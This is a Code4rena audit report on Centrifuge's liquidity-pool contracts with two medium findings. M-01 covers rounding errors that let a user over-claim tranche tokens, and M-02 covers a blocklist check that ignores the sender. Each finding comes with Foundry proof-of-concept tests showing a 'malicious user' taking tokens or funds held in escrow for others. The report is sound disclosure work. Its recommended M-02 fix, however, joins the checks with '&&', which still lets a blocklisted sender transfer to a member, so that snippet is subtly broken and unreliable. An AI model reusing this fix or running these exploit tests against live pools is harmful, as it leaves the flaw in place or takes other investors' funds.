
# Centrifuge

**Date:** 08.09.2023-14.09.2023
**Platform:** Code4rena

# Medium Findings

https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L580


## [M-01] Users can claim more tranche tokens than allowed by CFG

### Impact
Following a user's submission of a deposit request and depositing their USDC (or equivalent) into the escrow, the CFG chain calculates the tokens the user will receive based on the current exchange rate and updates the `maxMint` and `maxDeposit` variables accordingly. Subsequently, a user can choose to claim portions of the tokens or all at once.

The issue arises due to rounding errors in the functions that calculate the price and token awards for partial claims and when a user claims all tokens at once. In certain edge cases, these rounding errors can allow users to claim more tokens than permitted by the CFG chain using the maxMint variable. The errors stem from rounding down instead of up in the `_calculatePrice()` function:

```solidity
function _calculatePrice(uint128 currencyAmount, uint128 trancheTokenAmount, address liquidityPool) public view returns (uint256 depositPrice){

	...

	depositPrice = currencyAmountInPriceDecimals.mulDiv( 10 ** PRICE_DECIMALS, trancheTokenAmountInPriceDecimals, MathLib.Rounding.Down);
}
```

Furthermore, there should typically be an underflow when the claimed tokens are deducted from the `maxMint`. Solidity's underflow protection would then trigger a revert, making it impossible for users to claim more than allowed. Unfortunately, the developers have circumvented this security measure by implementing the function that decreases the user's `maxMint` variable as follows:

```solidity
function _decreaseDepositLimits(address user, address liquidityPool, uint128 _currency, uint128 trancheTokens) internal {
	LPValues storage lpValues = orderbook[user][liquidityPool];
	if (lpValues.maxDeposit < _currency) {
		lpValues.maxDeposit = 0;
	} else {
		lpValues.maxDeposit = lpValues.maxDeposit - _currency;
	}

	if (lpValues.maxMint < trancheTokens) {
		lpValues.maxMint = 0;
	} else {
		lpValues.maxMint = lpValues.maxMint - trancheTokens;
	}
}
```

This implementation allows a user to receive more tokens than they were allowed to without triggering an underflow protection. This scenario would necessitate there being more tokens in the escrow than there were initially minted for the users depositRequest, allowing the user to claim/steal tokens allocated to another user.

### Proof of Concept

The provided Proof of Concept (POC) is a fuzz test that explores various inputs and claim amounts leading to the user receiving more tokens than they should have been allowed to.

#### testMaliciousUserScenarioSingleDeposit
Example Inputs:
`totalAmount = 1`
`tokenAmount = 1480750103`

Result:
`Intended retrieved tokens = 1480750103`
`Actually retrieved tokens = 1480750105`

#### testMaliciousUserScenarioMultipleDeposit
Example Inputs:
`totalAmount = 2`
`deposit1    = 1`
`deposit2    = 1`
`tokenAmount = 2913902725`

Result:
`Intended retrieved tokens = 2913902725`
`Actually retrieved tokens = 2913902726`

Attached to this you can find the diff for both tests:

<details>

```diff
diff --git a/test/LiquidityPool.t.sol b/test/LiquidityPool_TestsDeposit.t.sol
index 4e60ec1..f514650 100644
--- a/test/LiquidityPool.t.sol
+++ b/test/LiquidityPool_TestsDeposit.t.sol
@@ -207,37 +207,106 @@ contract LiquidityPoolTest is TestSetup {
         investor.withdraw(lPool_, lPool.maxWithdraw(address(investor)), address(investor), address(investor));
     }
 
-    function testMint(
-        uint64 poolId,
-        string memory tokenName,
-        string memory tokenSymbol,
-        bytes16 trancheId,
-        uint128 currencyId,
-        uint256 amount,
-        uint64 validUntil
+    function testMaliciousUserScenarioSingleDeposit(
+        uint256 totalAmount,
+        uint256 tokenAmount
     ) public {
-        vm.assume(currencyId > 0);
-        vm.assume(amount < MAX_UINT128);
-        vm.assume(validUntil >= block.timestamp);
+        //These get set directly in the test
+        uint64 poolId = 1;
+        uint128 currencyId = 1;
+        bytes16 trancheId = 0x00000000000000000000000000000000;
 
-        address lPool_ = deployLiquidityPool(poolId, erc20.decimals(), tokenName, tokenSymbol, trancheId, currencyId);
-        LiquidityPool lPool = LiquidityPool(lPool_);
+        //As the values get scaled to 18 decimals but the tokens only have 6, we need to account for this, so no overflow is possible
+        vm.assume(totalAmount > 0 && totalAmount < type(uint128).max / 10**12);
+        vm.assume(tokenAmount > 0 && tokenAmount < type(uint128).max / 10**12);
 
-        Investor investor = new Investor();
+        //Deploy a pool
+        LiquidityPool lPool = LiquidityPool(deployLiquidityPool(poolId, erc20.decimals(), "Test", "T", trancheId, currencyId));
 
-        vm.expectRevert(bytes("Auth/not-authorized"));
-        lPool.mint(address(investor), amount);
+        //Some other users also have tokens currently in escrow, simplified here
+        root.relyContract(address(lPool), self); 
+        lPool.mint(address(escrow), 10000);
 
-        root.relyContract(lPool_, self); // give self auth permissions
+        // Malicious user gets added as a member
+        homePools.updateMember(poolId, trancheId, self, uint64(block.timestamp + 1)); 
 
-        vm.expectRevert(bytes("RestrictionManager/destination-not-a-member"));
-        lPool.mint(address(investor), amount);
+        // Malicious user has totalAmount
+        erc20.mint(self, totalAmount);
 
-        homePools.updateMember(poolId, trancheId, address(investor), validUntil); // add investor as member
+        // Malicious user adds an allowance for the IM
+        erc20.approve(address(investmentManager), totalAmount); 
 
-        lPool.mint(address(investor), amount);
-        assertEq(lPool.balanceOf(address(investor)), amount);
-        assertEq(lPool.balanceOf(address(investor)), lPool.share().balanceOf(address(investor)));
+        // Deposit is requested
+        lPool.requestDeposit(totalAmount, self);
+               
+        // Ensure funds are locked in escrow
+        assertEq(erc20.balanceOf(address(escrow)), totalAmount);
+        assertEq(erc20.balanceOf(self), 0);
+
+        // Gateway returns randomly generated values for amount of tranche tokens and currency
+        homePools.isExecutedCollectInvest(
+            poolId, trancheId, bytes32(bytes20(self)), currencyId, uint128(totalAmount), uint128(tokenAmount)
+        );
+
+        // Malicious user calls to claim tokens
+        lPool.deposit(totalAmount, self);
+
+        // Malicious user has less or equal to the tokens that he should be allowed to hav by CFG
+        assertLe(lPool.balanceOf(self), tokenAmount);
+    }
+
+    function testMaliciousUserScenarioMultipleDeposit(        
+        uint256 totalAmount,
+        uint256 deposit1,
+        uint256 deposit2,
+        uint256 tokenAmount
+    ) public {
+        //These get set directly in the test
+        uint64 poolId = 1;
+        uint128 currencyId = 1;
+        bytes16 trancheId = 0x00000000000000000000000000000000;
+
+        //As the values get scaled to 18 decimals but the tokens only have 6, we need to account for this, so no overflow is possible
+        vm.assume(totalAmount > 0 && totalAmount < type(uint128).max / 10**12);
+        vm.assume(tokenAmount > 0 && tokenAmount < type(uint128).max / 10**12);
+        vm.assume(deposit1 > 0 && deposit1 < type(uint128).max / 10**12);
+        vm.assume(deposit2 > 0 && deposit2 < type(uint128).max / 10**12);
+        vm.assume(deposit1+deposit2==totalAmount);
+
+        //Deploy a pool
+        LiquidityPool lPool = LiquidityPool(deployLiquidityPool(poolId, erc20.decimals(), "Test", "T", trancheId, currencyId));
+
+        //Some other users also have tokens currently in escrow, simplified here
+        root.relyContract(address(lPool), self); 
+        lPool.mint(address(escrow), 10000);
+
+        // Malicious user gets added as a member
+        homePools.updateMember(poolId, trancheId, self, uint64(block.timestamp + 1)); 
+
+        // Malicious user has totalAmount
+        erc20.mint(self, totalAmount);
+
+        // Malicious user adds an allowance for the IM
+        erc20.approve(address(investmentManager), totalAmount); 
+
+        // Deposit is requested
+        lPool.requestDeposit(totalAmount, self);
+               
+        // Ensure funds are locked in escrow
+        assertEq(erc20.balanceOf(address(escrow)), totalAmount);
+        assertEq(erc20.balanceOf(self), 0);
+
+        // Gateway returns randomly generated values for amount of tranche tokens and currency
+        homePools.isExecutedCollectInvest(
+            poolId, trancheId, bytes32(bytes20(self)), currencyId, uint128(totalAmount), uint128(tokenAmount)
+        );
+
+        // Malicious user calls to claim tokens
+        lPool.deposit(deposit1, self);
+        lPool.deposit(deposit2, self);
+
+        // Malicious user has less or equal to the tokens that he should be allowed to hav by CFG
+        assertLe(lPool.balanceOf(self), tokenAmount);
     }
 
     function testBurn(
@@ -1346,4 +1415,4 @@ contract LiquidityPoolTest is TestSetup {
         );
         investor.deposit(_lPool, amount, _investor); // deposit the amount
     }
-}
+}
\ No newline at end of file
```
</details>


### Tools Used
Manual Review

### Recommended Mitigation Steps
Initially, it might seem that the issue can be resolved by switching the rounding method from `MathLib.Rounding.Down` to `MathLib.Rounding.Up` in the `_calculatePrice()` function. However, this straightforward adjustment triggers complications within the redeem process.

Changing the rounding function to `MathLib.Rounding.Up` leads to incorrect price calculations during the `processRedeem()` functionality. The core problem is partially fixed/secured by the UserEscrow contract, which includes a safeguard preventing users from withdrawing more USDC than they are permitted to based on the CFG chain.

```solidity
function transferOut(address token, address destination, address receiver, uint256 amount) external auth {
	require(destinations[token][destination] >= amount, "UserEscrow/transfer-failed");
	...
}
```

Nevertheless, modifying the rounding function in this manner results in users being unable to redeem the full tokens permited to redeem by CFG, as this safeguard is triggered. While this prevents the UserEscrow from transferring out other users' funds, it can lead to inconvenience and confusion for users who are only able to withdraw a partial amount of the tokens they requested to redeem.

Below, you will find the code diff for two test cases illustrating these issues, covering both partial and full redemption scenarios:

#### testMaliciousUserScenarioSingleRedeem
Example Inputs:
`totalRedeemableUSDC = 452857328473`
`tokenAmount         = 498106289492761508995438`

#### testMaliciousUserScenarioMultipleRedeem
Example Inputs:
`redeem1             = 1`
`totalRedeemableUSDC = 1`
`tokenAmount         = 2000000000004000001`

<details>

```diff
diff --git a/test/LiquidityPool.t.sol b/test/LiquidityPool_TestsRedeem.t.sol
index 4e60ec1..15a0683 100644
--- a/test/LiquidityPool.t.sol
+++ b/test/LiquidityPool_TestsRedeem.t.sol
@@ -207,37 +207,125 @@ contract LiquidityPoolTest is TestSetup {
         investor.withdraw(lPool_, lPool.maxWithdraw(address(investor)), address(investor), address(investor));
     }
 
-    function testMint(
-        uint64 poolId,
-        string memory tokenName,
-        string memory tokenSymbol,
-        bytes16 trancheId,
-        uint128 currencyId,
-        uint256 amount,
-        uint64 validUntil
+    function testMaliciousUserScenarioSingleRedeem(
+        uint128 totalRedeemableUSDC,
+        uint128 tokenAmount
     ) public {
-        vm.assume(currencyId > 0);
-        vm.assume(amount < MAX_UINT128);
-        vm.assume(validUntil >= block.timestamp);
+        //These get set directly in the test
+        uint64 poolId = 1;
+        uint128 currencyId = 1;
+        bytes16 trancheId = 0x00000000000000000000000000000000;
 
-        address lPool_ = deployLiquidityPool(poolId, erc20.decimals(), tokenName, tokenSymbol, trancheId, currencyId);
-        LiquidityPool lPool = LiquidityPool(lPool_);
+        //As the values get scaled to 18 decimals but the tokens only have 6 decimals, we need to account for this, so no overflow is possible
+        vm.assume(totalRedeemableUSDC > 0 && totalRedeemableUSDC < type(uint128).max / 10**12);
+        vm.assume(tokenAmount > 0 && tokenAmount < type(uint128).max / 10**12);
 
-        Investor investor = new Investor();
+        //Deploy a pool
+        LiquidityPool lPool = LiquidityPool(deployLiquidityPool(poolId, erc20.decimals(), "Test", "T", trancheId, currencyId));
 
-        vm.expectRevert(bytes("Auth/not-authorized"));
-        lPool.mint(address(investor), amount);
+        //Malicious user deposited into the LP some time ago
+        uint256 first_invest = 1000000000000;
+        erc20.mint(self, first_invest);
+        erc20.approve(address(investmentManager), first_invest); 
+        homePools.updateMember(poolId, trancheId, self, uint64(block.timestamp + 1)); 
+        lPool.requestDeposit(first_invest, self);
+        homePools.isExecutedCollectInvest(poolId, trancheId, bytes32(bytes20(self)), currencyId, uint128(first_invest), tokenAmount);
+        uint128 receivedTokenAmount = uint128(lPool.deposit(first_invest, self));
 
-        root.relyContract(lPool_, self); // give self auth permissions
+        //User should have his tokens now
+        assertEq(lPool.balanceOf(self), receivedTokenAmount);
 
-        vm.expectRevert(bytes("RestrictionManager/destination-not-a-member"));
-        lPool.mint(address(investor), amount);
+        //Some other users now also deposit USDC in escrow, simplified here
+        erc20.mint(address(escrow), totalRedeemableUSDC);
 
-        homePools.updateMember(poolId, trancheId, address(investor), validUntil); // add investor as member
+        //There is also some money currently in user escrow, also simplified
+        erc20.mint(address(userEscrow), 10000000000000000000);
 
-        lPool.mint(address(investor), amount);
-        assertEq(lPool.balanceOf(address(investor)), amount);
-        assertEq(lPool.balanceOf(address(investor)), lPool.share().balanceOf(address(investor)));
+        // IM gets allowance for the totalAmount by the malicious user
+        lPool.approve(address(investmentManager), uint256(receivedTokenAmount)); 
+
+        // User requests deposit
+        lPool.requestRedeem(uint256(receivedTokenAmount), self);
+
+        // Gateway returns that price is 1:1 so maxWithdraw and maxRedeem get set to 100
+        homePools.isExecutedCollectRedeem(
+            poolId, trancheId, bytes32(bytes20(self)), currencyId, totalRedeemableUSDC, receivedTokenAmount
+        );
+
+        //Calculation to split the received tokens into two parts
+        lPool.redeem(uint256(receivedTokenAmount), self, self);
+
+        // Malicious user should have more USDC than intended
+        assertLe(erc20.balanceOf(self), uint256(totalRedeemableUSDC));
+    }
+
+
+    function testMaliciousUserScenarioMultipleRedeem(
+        uint128 redeem1,
+        uint128 totalRedeemableUSDC,
+        uint128 tokenAmount
+    ) public {
+        //These get set directly in the test
+        uint64 poolId = 1;
+        uint128 currencyId = 1;
+        bytes16 trancheId = 0x00000000000000000000000000000000;
+
+        //As the values get scaled to 18 decimals but the tokens only have 6 decimals, we need to account for this, so no overflow is possible
+        vm.assume(totalRedeemableUSDC > 0 && totalRedeemableUSDC < type(uint128).max / 10**12);
+        vm.assume(tokenAmount > 0 && tokenAmount < type(uint128).max / 10**12);
+        vm.assume(redeem1 > 0 && redeem1 < type(uint128).max / 10**12);
+        
+        //Deploy a pool
+        LiquidityPool lPool = LiquidityPool(deployLiquidityPool(poolId, erc20.decimals(), "Test", "T", trancheId, currencyId));
+
+        //Malicious user deposited into the LP some time ago
+        uint256 first_invest = 1000000000000;
+        erc20.mint(self, first_invest);
+        erc20.approve(address(investmentManager), first_invest); 
+        homePools.updateMember(poolId, trancheId, self, uint64(block.timestamp + 1)); 
+        lPool.requestDeposit(first_invest, self);
+        homePools.isExecutedCollectInvest(poolId, trancheId, bytes32(bytes20(self)), currencyId, uint128(first_invest), tokenAmount);
+        uint128 receivedTokenAmount = uint128(lPool.deposit(first_invest, self));
+
+        //User should have his tokens now
+        assertEq(lPool.balanceOf(self), receivedTokenAmount);
+
+        //Some other users now also deposit USDC in escrow, simplified here
+        erc20.mint(address(escrow), totalRedeemableUSDC);
+
+        //There is also some money currently in user escrow, also simplified
+        erc20.mint(address(userEscrow), 10000000000000000000);
+
+        // IM gets allowance for the totalAmount by the malicious user
+        lPool.approve(address(investmentManager), uint256(receivedTokenAmount)); 
+
+        // User requests deposit
+        lPool.requestRedeem(uint256(receivedTokenAmount), self);
+
+        // Gateway returns that price is 1:1 so maxWithdraw and maxRedeem get set to 100
+        homePools.isExecutedCollectRedeem(
+            poolId, trancheId, bytes32(bytes20(self)), currencyId, totalRedeemableUSDC, receivedTokenAmount
+        );
+
+        //Calculation to split the received tokens into two parts
+        redeem1 = redeem1 % receivedTokenAmount;
+        uint128 redeem2 = receivedTokenAmount - redeem1;
+
+        assertEq(redeem1+redeem2, receivedTokenAmount);
+
+        //Due to the mod one of both could be 0
+        if (redeem1 != 0)
+        {
+            lPool.redeem(uint256(redeem1), self, self);
+        }
+
+        if(redeem2 != 0)
+        {
+            lPool.redeem(uint256(redeem2), self, self);
+        }
+
+        // Malicious user should have more USDC than intended
+        assertLe(erc20.balanceOf(self), uint256(totalRedeemableUSDC));
     }
 
     function testBurn(
@@ -1346,4 +1434,4 @@ contract LiquidityPoolTest is TestSetup {
         );
         investor.deposit(_lPool, amount, _investor); // deposit the amount
     }
-}
+}
\ No newline at end of file
```
</details>

To address this issue, the recommendation to the project team is to split the `_calculatePrice` function into two functions: `_calculatePriceInbound` and `_calculatePriceOutgoing`. For `_calculatePriceInbound`, use the rounding function `MathLib.Rounding.Up`, and for `_calculatePriceOutgoing`, use the rounding function `MathLib.Rounding.Down`.

This approach will ensure that both the minting and redeeming processes work correctly without rounding errors while maintaining the necessary security measures.

## [M-02] Insufficient Restriction checks on the blocklist


https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/token/RestrictionManager.sol#L28


# Vulnerability details

## Impact
The tranche token incorporates functionalities to comply with ERC1404 requirements. This design aims to ensure that, in the event an address is added to a sanction list, that address is removed as a member (by setting its validity to the current timestamp), and all corresponding tranche tokens become non-transferable, unburnable, and un-mintable.

According to the contest description the intended behavior can be described like this: "Removing an investor from the memberlist in the Restriction Manager locks their tokens. This is expected behaviour."

However, there is a critical flaw in the implementation. The `detectTransferRestriction()` function only verifies the destination address of a transaction for membership status (not being blacklisted) but neglects to check the source address. This oversight allows blacklisted users to transfer their tokens to any address not on the blacklist, effectively bypassing the imposed restrictions.

```solidity
function detectTransferRestriction(address from, address to, uint256 value) public view returns (uint8) {
	if (!hasMember(to)) {
		return DESTINATION_NOT_A_MEMBER_RESTRICTION_CODE;
	}
	return SUCCESS_CODE;
}
```
Moreover, even in non-malicious scenarios, expired members can still transfer their tokens, which contradicts the intended behavior.

## Proof of Concept

In the provided Proof of Concept, it is demonstrated that a blacklisted user can successfully transfer their tokens after supposedly being "removed" as a member, exploiting the existing vulnerability.

<details>

```diff
diff --git a/test/token/Tranche.t.sol.orig b/test/token/Tranche_BlocklistIneffective.t.sol
index 38889a3..4c18960 100644
--- a/test/token/Tranche.t.sol.orig
+++ b/test/token/Tranche_BlocklistIneffective.t.sol
@@ -159,6 +159,43 @@ contract TrancheTokenTest is Test {
         assertEq(token.balanceOf(targetUser), 0);
     }
 
+    function testTransferFromTokensFromBlacklistedMember(uint256 amount, address sourceUser,address targetUser, uint256 validUntil) public {
+        
+        vm.assume(validUntil > block.timestamp + 1 && 
+                    sourceUser != address(0) && sourceUser != address(this) && sourceUser != address(token) && 
+                    targetUser != address(0) && targetUser != address(this) && targetUser != address(token));
+
+        //Source user is not blacklisted
+        restrictionManager.updateMember(sourceUser, validUntil);
+        assertEq(restrictionManager.members(sourceUser), validUntil);
+
+        //Mint to source
+        token.mint(address(this), amount);
+        token.transferFrom(address(this), sourceUser, amount);
+        assertEq(token.balanceOf(sourceUser), amount);
+
+        //Source user gets blacklisted
+        //NOTE: This is the only way we can currently remove a member, described in other issue
+        restrictionManager.updateMember(sourceUser, block.timestamp);
+
+        //Now we need to update the timestamp otherwise the user would still be valid
+        vm.warp(block.timestamp + 1);
+
+        //The blacklisted user gets a membership for the tranche with his new account
+        restrictionManager.updateMember(targetUser, validUntil);
+
+        //Transfer from the blacklisted user
+        vm.prank(sourceUser);
+        token.transfer(targetUser, amount);
+
+
+        //SourceUser should be blacklisted and have no money anymore, destination user should be not blacklisted and have all the tokens
+        assertEq(token.balanceOf(sourceUser), 0);
+        assertEq(token.balanceOf(targetUser), amount);
+        assertEq(RestrictionManager(address(token.restrictionManager())).hasMember(sourceUser), false);
+        assertEq(RestrictionManager(address(token.restrictionManager())).hasMember(targetUser), true);
+    }
+
     // Transfer
     function testTransferTokensToMemberWorks(uint256 amount, address targetUser, uint256 validUntil) public {
         vm.assume(baseAssumptions(validUntil, targetUser));
```
</details>

## Tools Used
Manual Review

## Recommended Mitigation Steps
To address this issue, an additional check should be introduced within the `detectTransferRestriction()` function to ensure comprehensive verification. This enhanced implementation could resemble the following:

```solidity
// --- ERC1404 implementation ---

function detectTransferRestriction(address from, address to, uint256 value) public view returns (uint8) {
	if (!hasMember(to) && !hasMember(from)) {
		return DESTINATION_NOT_A_MEMBER_RESTRICTION_CODE;
	}
	return SUCCESS_CODE;
}
```

</details>